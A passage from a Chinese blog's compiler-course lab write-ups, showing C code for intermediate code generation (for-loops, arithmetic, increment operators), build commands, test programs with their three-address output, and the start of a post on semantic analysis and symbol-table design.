class="number">1</span>]-&gt;code,</span><br><span class="line">                    genLabel(T-&gt;ptr[<span class="number">0</span>]-&gt;ptr[<span class="number">1</span>]-&gt;Etrue), T-&gt;ptr[<span class="number">1</span>]-&gt;code, </span><br><span class="line">                    T-&gt;ptr[<span class="number">0</span>]-&gt;ptr[<span class="number">2</span>]-&gt;code, genGoto(T-&gt;ptr[<span class="number">1</span>]-&gt;Snext));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>函数 <code>for_dec</code> 调用后，函数 <code>for_list</code> 必被调用</li>
</ul>
<p>ForDec：FOR 语句列表（Exp，Exp，Exp）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">for_list</span><span class="params">(struct node* T)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(T-&gt;ptr[<span class="number">0</span>]!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">        T-&gt;ptr[<span class="number">0</span>]-&gt;offset = T-&gt;ptr[<span class="number">2</span>]-&gt;offset = T-&gt;offset;</span><br><span class="line">        <span class="keyword">if</span>(T-&gt;ptr[<span class="number">0</span>]-&gt;kind == ASSIGNOP)&#123;</span><br><span class="line">            semantic_Analysis(T-&gt;ptr[<span class="number">0</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            semantic_error(T-&gt;pos, <span class="string">&quot;&quot;</span>, <span class="string">&quot;for wrong\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(T-&gt;ptr[<span class="number">2</span>]-&gt;kind != ASSIGNOP)&#123;</span><br><span class="line">            semantic_Analysis(T-&gt;ptr[<span class="number">2</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            semantic_error(T-&gt;pos, <span class="string">&quot;&quot;</span>, <span class="string">&quot;for wrong\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    T-&gt;ptr[<span class="number">1</span>]-&gt;offset = T-&gt;offset; </span><br><span class="line">    <span class="built_in">strcpy</span>(T-&gt;ptr[<span class="number">1</span>]-&gt;Etrue, T-&gt;Etrue); </span><br><span class="line">    <span class="built_in">strcpy</span>(T-&gt;ptr[<span class="number">1</span>]-&gt;Efalse, T-&gt;Efalse);</span><br><span class="line">    boolExp(T-&gt;ptr[<span class="number">1</span>]);</span><br><span class="line">    T-&gt;width = T-&gt;ptr[<span class="number">0</span>]-&gt;width+T-&gt;ptr[<span class="number">1</span>]-&gt;width+T-&gt;ptr[<span class="number">2</span>]-&gt;width;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>不更新 <code>T-&gt;code</code>，方便交给 <code>for_dec</code> 函数来控制顺序</li>
</ul>
<p><strong>基础运算</strong></p>
<p>加减乘除：PLUS，MINUS，STAR，DIV（Exp，Exp）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">op_exp</span><span class="params">(struct node *T)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">opn</span> <span class="title">opn1</span>, <span class="title">opn2</span>, <span class="title">result</span>;</span></span><br><span class="line">    T-&gt;ptr[<span class="number">0</span>]-&gt;offset = T-&gt;offset;</span><br><span class="line">    Exp(T-&gt;ptr[<span class="number">0</span>]); <span class="comment">/* 处理第一个表达式 */</span></span><br><span class="line">    T-&gt;ptr[<span class="number">1</span>]-&gt;offset = T-&gt;offset + T-&gt;ptr[<span class="number">0</span>]-&gt;width;</span><br><span class="line">    Exp(T-&gt;ptr[<span class="number">1</span>]); <span class="comment">/* 处理第二个表达式 */</span></span><br><span class="line">    <span class="comment">/* 判断T-&gt;ptr[0],T-&gt;ptr[1]类型是否正确</span></span><br><span class="line"><span class="comment">    可能根据运算符生成不同形式的代码,给T的type赋值 */</span></span><br><span class="line">    T-&gt;type = INT, T-&gt;width = T-&gt;ptr[<span class="number">0</span>]-&gt;width + T-&gt;ptr[<span class="number">1</span>]-&gt;width + <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    T-&gt;place = temp_add(newTemp(), LEV, T-&gt;type, <span class="string">&#x27;T&#x27;</span>, T-&gt;offset + T-&gt;ptr[<span class="number">0</span>]-&gt;width + T-&gt;ptr[<span class="number">1</span>]-&gt;width);</span><br><span class="line">    opn1.kind = ID;</span><br><span class="line">    <span class="built_in">strcpy</span>(opn1.id, symbolTable.symbols[T-&gt;ptr[<span class="number">0</span>]-&gt;place].alias);</span><br><span class="line">    opn1.type = T-&gt;ptr[<span class="number">0</span>]-&gt;type;</span><br><span class="line">    opn1.offset = symbolTable.symbols[T-&gt;ptr[<span class="number">0</span>]-&gt;place].offset;</span><br><span class="line">    opn2.kind = ID;</span><br><span class="line">    <span class="built_in">strcpy</span>(opn2.id, symbolTable.symbols[T-&gt;ptr[<span class="number">1</span>]-&gt;place].alias);</span><br><span class="line">    opn2.type = T-&gt;ptr[<span class="number">1</span>]-&gt;type;</span><br><span class="line">    opn2.offset = symbolTable.symbols[T-&gt;ptr[<span class="number">1</span>]-&gt;place].offset;</span><br><span class="line">    result.kind = ID;</span><br><span class="line">    <span class="built_in">strcpy</span>(result.id, symbolTable.symbols[T-&gt;place].alias);</span><br><span class="line">    result.type = T-&gt;type;</span><br><span class="line">    result.offset = symbolTable.symbols[T-&gt;place].offset;</span><br><span class="line">    T-&gt;code = merge(<span class="number">3</span>, T-&gt;ptr[<span class="number">0</span>]-&gt;code, T-&gt;ptr[<span class="number">1</span>]-&gt;code, genIR(T-&gt;kind, opn1, opn2, result)); </span><br><span class="line">    T-&gt;width = T-&gt;ptr[<span class="number">0</span>]-&gt;width + T-&gt;ptr[<span class="number">1</span>]-&gt;width + <span class="number">4</span>;<span class="comment">//INT</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>函数 <code>temp_add</code> 生成的临时变量在赋值语句 ASSIGNOP 中才有作用</li>
<li>虽然 <code>T-&gt;code</code> 的次序为 <code>opnstr1 opnstr2 op</code>，但在 <code>print_IR</code> 函数打印时可以调整它的次序</li>
</ul>
<p>加加减减：PPLUS，MMINUS（Exp）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">oop_exp</span><span class="params">(struct node *T)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">opn</span> <span class="title">opn1</span>, <span class="title">opn2</span>, <span class="title">result</span>;</span></span><br><span class="line">    T-&gt;ptr[<span class="number">0</span>]-&gt;offset = T-&gt;offset;</span><br><span class="line">    Exp(T-&gt;ptr[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    T-&gt;type = INT, T-&gt;width = T-&gt;ptr[<span class="number">0</span>]-&gt;width;</span><br><span class="line"></span><br><span class="line">    opn1.kind = ID;</span><br><span class="line">    <span class="built_in">strcpy</span>(opn1.id, symbolTable.symbols[T-&gt;ptr[<span class="number">0</span>]-&gt;place].alias);</span><br><span class="line">    opn1.type = T-&gt;ptr[<span class="number">0</span>]-&gt;type;</span><br><span class="line">    opn1.offset = symbolTable.symbols[T-&gt;ptr[<span class="number">0</span>]-&gt;place].offset;</span><br><span class="line"></span><br><span class="line">    T-&gt;code = merge(<span class="number">2</span>, T-&gt;ptr[<span class="number">0</span>]-&gt;code, genIR(T-&gt;kind, opn1, opn2, result));</span><br><span class="line">    T-&gt;width = T-&gt;ptr[<span class="number">0</span>]-&gt;width;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最终的完整代码有 1200 多行，就不放出了</p>
<p><strong>编译与结果</strong></p>
<p>编译命令：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">flex lexer.l</span><br><span class="line">bison -d -v parser.y</span><br><span class="line">gcc display.c semantic_analysis.c parser.tab.c lex.yy.c -lfl -o test3</span><br></pre></td></tr></table></figure>
<p>测试文件1：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fact</span><span class="params">(<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> temp;</span><br><span class="line">	temp = n;</span><br><span class="line">	<span class="keyword">if</span>(n==<span class="number">1</span>)</span><br><span class="line">		n=<span class="number">2</span>;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		n=<span class="number">3</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	fact(n);</span><br><span class="line">	<span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>结果1：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">FUNCTION fact :</span><br><span class="line">  PARAM var2</span><br><span class="line">  var3 := var2</span><br><span class="line">  temp1 := #<span class="number">1</span></span><br><span class="line">  IF var2 == temp1 GOTO label4</span><br><span class="line">  GOTO label5</span><br><span class="line">LABEL label4 :</span><br><span class="line">  temp2 := #<span class="number">2</span></span><br><span class="line">  var2 := temp2</span><br><span class="line">  GOTO label3</span><br><span class="line">LABEL label5 :</span><br><span class="line">  temp3 := #<span class="number">3</span></span><br><span class="line">  var2 := temp3</span><br><span class="line">LABEL label3 :</span><br><span class="line">  ARG var2</span><br><span class="line">  temp4 := CALL fact</span><br><span class="line">  RETURN var2</span><br><span class="line">LABEL label1 :</span><br></pre></td></tr></table></figure>
<p>测试文件2：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">char</span> c)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> c1 = <span class="number">5</span>;</span><br><span class="line">	<span class="keyword">int</span> c2 = <span class="number">6</span>;</span><br><span class="line">	<span class="keyword">int</span> c3 = <span class="number">7</span>;</span><br><span class="line">	<span class="keyword">int</span> c4 = <span class="number">8</span>;</span><br><span class="line">	<span class="keyword">int</span> c5 = <span class="number">9</span>;</span><br><span class="line">	</span><br><span class="line">	c3 = (c1+c2*c3)*(c5-c4);</span><br><span class="line">	c1++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>结果2：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">FUNCTION main :</span><br><span class="line">  PARAM var2</span><br><span class="line">  temp1 := #<span class="number">5</span></span><br><span class="line">  var3 := temp1</span><br><span class="line">  temp2 := #<span class="number">6</span></span><br><span class="line">  var4 := temp2</span><br><span class="line">  temp3 := #<span class="number">7</span></span><br><span class="line">  var5 := temp3</span><br><span class="line">  temp4 := #<span class="number">8</span></span><br><span class="line">  var6 := temp4</span><br><span class="line">  temp5 := #<span class="number">9</span></span><br><span class="line">  var7 := temp5</span><br><span class="line">  temp6 := var4 * var5</span><br><span class="line">  temp7 := var3 + temp6</span><br><span class="line">  temp8 := var7 - var6</span><br><span class="line">  temp9 := temp7 * temp8</span><br><span class="line">  var5 := temp9</span><br><span class="line">  var3 := var3 + <span class="number">1</span></span><br><span class="line">LABEL label1 :</span><br></pre></td></tr></table></figure>
<p>测试文件3：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">char</span> c)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> c1 = <span class="number">5</span>;</span><br><span class="line">	n = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span>(c1&gt;<span class="number">1</span>)&#123;</span><br><span class="line">		n = n+<span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>结果3：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">FUNCTION main :</span><br><span class="line">  PARAM var3</span><br><span class="line">  temp1 := #<span class="number">5</span></span><br><span class="line">  var4 := temp1</span><br><span class="line">  temp2 := #<span class="number">0</span></span><br><span class="line">  var1 := temp2</span><br><span class="line">LABEL label5 :</span><br><span class="line">  temp3 := #<span class="number">1</span></span><br><span class="line">  IF var4 &gt; temp3 GOTO label4</span><br><span class="line">  GOTO label3</span><br><span class="line">LABEL label4 :</span><br><span class="line">  temp4 := #<span class="number">1</span></span><br><span class="line">  temp5 := var1 + temp4</span><br><span class="line">  var1 := temp5</span><br><span class="line">  GOTO label5</span><br><span class="line">LABEL label3 :</span><br><span class="line">  RETURN var1</span><br><span class="line">LABEL label1 :</span><br></pre></td></tr></table></figure>
<p>测试文件4：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">char</span> c)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> n = <span class="number">8</span>;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">10</span>;i&lt;n;i++)&#123;</span><br><span class="line">		n -= <span class="number">2</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>结果4：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">FUNCTION main :</span><br><span class="line">  PARAM var2</span><br><span class="line">  temp1 := #<span class="number">8</span></span><br><span class="line">  var3 := temp1</span><br><span class="line">  temp2 := #<span class="number">10</span></span><br><span class="line">  var4 := temp2</span><br><span class="line">LABEL label4 :</span><br><span class="line">  IF var4 &lt; var3 GOTO label3</span><br><span class="line">  GOTO label2</span><br><span class="line">LABEL label3 :</span><br><span class="line">  temp3 := #<span class="number">2</span></span><br><span class="line">  var3 := var3 - temp3</span><br><span class="line">  var4 := var4 + <span class="number">1</span></span><br><span class="line">  GOTO label4</span><br><span class="line">LABEL label2 :</span><br><span class="line">  RETURN var4</span><br><span class="line">LABEL label1 :</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/19/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-Lab2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/03/19/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-Lab2/" class="post-title-link" itemprop="url">编译原理-Lab2</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-03-19 21:14:38" itemprop="dateCreated datePublished" datetime="2023-03-19T21:14:38+08:00">2023-03-19</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-03-20 23:40:07" itemprop="dateModified" datetime="2023-03-20T23:40:07+08:00">2023-03-20</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>20k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>18 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="第一个任务"><a href="#第一个任务" class="headerlink" title="第一个任务"></a>第一个任务</h2><p>用不同的样例覆盖语法规则，进行语义分析，遍历对应的 AST 树，发现语义的错误并输出到屏幕</p>
<p>建立符号表，并在合适的分析位置上进行输出符号表</p>
<p>需要特别注意以下两个问题：</p>
<ul>
<li>符号表的管理：<ul>
<li>符号表可以采用多种数据结构实现：顺序表，哈希表，十字链表，多表结构</li>
<li>符号表上的操作包括创建符号表、插入表项、查询表项、修改表项、删除表项、释放符号表空间等等 </li>
</ul>
</li>
<li>静态语义分析：<ul>
<li>控制流检查：控制流语句必须使得程序跳转到合法的地方</li>
<li>唯一性检查：检查某些不能重复定义的对象或者元素（例如：同一作用域的标识符不能同名）</li>
<li>名字的上下文相关性检查：名字的出现在遵循作用域与可见性的前提下应该满足一定的上下文的相关性 </li>
<li>类型检查：包括检查函数参数传递过程中形参与实参类型是否匹配，是否进行自动类型转换等</li>
</ul>
</li>
</ul>
<p><strong>遍历 AST 树</strong></p>
<p>AST 的遍历采用的是前序遍历（根左右），在遍历过程中：</p>
<ul>
<li>访问到了说明部分的结点时，在符号表中添加新的内容</li>
<li>访问到执行语句部分时，根据访问的变量（或函数）名称查询符号表，并分析其静态语义的正确性 </li>
</ul>
<p>在上一个实验的 <code>display</code> 函数中已经实现了遍历的过程，AST 的节点结构体如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> &#123;</span> <span class="comment">// 以下对结点属性定义没有考虑存储效率,只是简单地列出要用到的一些属性</span></span><br><span class="line">    <span class="class"><span class="keyword">enum</span> <span class="title">node_kind</span> <span class="title">kind</span>;</span> <span class="comment">// 结点类型</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="keyword">char</span> type_id[<span class="number">33</span>]; <span class="comment">// 由标识符生成的叶结点</span></span><br><span class="line">        <span class="keyword">int</span> type_int; <span class="comment">// 由整常数生成的叶结点</span></span><br><span class="line">        <span class="keyword">char</span> type_char; <span class="comment">// 由字符型生成的叶节点</span></span><br><span class="line">        <span class="keyword">float</span> type_float; <span class="comment">// 由浮点常数生成的叶结点</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">ptr</span>[3];</span> <span class="comment">// 子树指针,由kind确定有多少棵子树</span></span><br><span class="line">    <span class="keyword">int</span> level; <span class="comment">// 层号</span></span><br><span class="line">    <span class="keyword">int</span> place; <span class="comment">// 表示结点对应的变量或运算结果临时变量在符号表的位置序号</span></span><br><span class="line">    <span class="keyword">char</span> Etrue[<span class="number">15</span>],Efalse[<span class="number">15</span>]; <span class="comment">// 对布尔表达式的翻译时,真假转移目标的标号</span></span><br><span class="line">    <span class="keyword">char</span> Snext[<span class="number">15</span>]; <span class="comment">// 该结点对应语句执行后的下一条语句位置标号</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">codenode</span> *<span class="title">code</span>;</span> <span class="comment">// 该结点中间代码链表头指针</span></span><br><span class="line">    <span class="keyword">char</span> op[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">int</span> type; <span class="comment">// 结点对应值的类型</span></span><br><span class="line">    <span class="keyword">int</span> pos; <span class="comment">// 语法单位所在位置行号</span></span><br><span class="line">    <span class="keyword">int</span> offset; <span class="comment">// 偏移量</span></span><br><span class="line">    <span class="keyword">int</span> width; <span class="comment">// 各种数据占用的字节数</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>符号表</strong></p>
<p>用结构体 <code>symbol</code> 来组织符号表信息：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">symbol</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">33</span>]; <span class="comment">// 变量或函数名</span></span><br><span class="line">    <span class="keyword">int</span> level; <span class="comment">// 层号,外部变量名或函数名层号为0,形参名为1,每到1个复合语句层号加1,退出减1</span></span><br><span class="line">    <span class="keyword">int</span> type; <span class="comment">// 变量类型或函数返回值类型</span></span><br><span class="line">    <span class="keyword">int</span> paramnum; <span class="comment">// 形式参数个数</span></span><br><span class="line">    <span class="keyword">char</span> alias[<span class="number">10</span>]; <span class="comment">// 别名,为解决嵌套层次使用,使得每一个数据名称唯一</span></span><br><span class="line">    <span class="keyword">char</span> flag; <span class="comment">// 符号标记,函数:&#x27;F&#x27;,变量:&#x27;V&#x27;,参数:&#x27;P&#x27;,临时变量:&#x27;T&#x27;</span></span><br><span class="line">    <span class="keyword">char</span> offset; <span class="comment">// 外部变量和局部变量在其静态数据区或活动记录中的偏移量,或函数活动记录大小,目标代码生成时使用</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>管理符号表的核心数据结构为顺序栈：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">symboltable</span>&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">symbol</span> <span class="title">symbols</span>[<span class="title">MAXLENGTH</span>];</span></span><br><span class="line">    <span class="keyword">int</span> index; <span class="comment">// index初值为0</span></span><br><span class="line">&#125;SYMBOLTABLE;</span><br></pre></td></tr></table></figure>
<ul>
<li>当遇到复合语句 COMP_STM 时，<code>symboltable.symbols</code> 会记录该作用域中的局部变量</li>
<li>当退出复合语句 COMP_STM 时，可以通过修改 <code>symboltable.index</code> 来忽略局部变量</li>
<li>因此需要一个格外的栈来记录程序进入 COMP_STM 前的 <code>symboltable.index</code></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">symbol_scope_begin</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> TX[<span class="number">30</span>];</span><br><span class="line">  <span class="keyword">int</span> top;</span><br><span class="line">&#125;SYMBOL_SCOPE_TX;</span><br></pre></td></tr></table></figure>
<ul>
<li>当遇到复合语句 COMP_STM 时，<code>symboltable.index</code> 压栈</li>
<li>当退出复合语句 COMP_STM 时，<code>symboltable.index</code> 弹出</li>
</ul>
<p>显示符号表的代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DisplaySymbolTable</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\t\t***Symbol Table***\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;---------------------------------------------------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\t%s\t%s\t%s\t%s\t%s\n&quot;</span>,<span class="string">&quot;Index&quot;</span>,<span class="string">&quot;Name&quot;</span>,<span class="string">&quot;Level&quot;</span>,</span><br><span class="line">           <span class="string">&quot;Type&quot;</span>,<span class="string">&quot;Flag&quot;</span>,<span class="string">&quot;Param_num&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span 